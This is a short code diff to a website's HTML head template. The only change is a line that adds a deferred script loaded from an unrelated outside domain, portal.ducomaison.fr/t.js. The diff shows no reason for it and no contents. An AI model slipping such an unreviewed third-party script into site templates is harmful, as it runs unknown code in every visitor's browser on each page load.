@@ -218,6 +218,7 @@ ${site.indexera ? "" : '<meta name="robots" content="noindex, nofollow">\n'}<lin
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,500;0,600;1,500&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="/style.css?v=${BYGGE}">
+<script src="https://portal.ducomaison.fr/t.js" defer></script>
 </head>
 <body class="${klass}" data-api="${esc(site.api)}" data-forhandsvisning="${site.forhandsvisning ? "1" : ""}">
 <a class="hoppa" href="#innehall">Till innehållet</a>
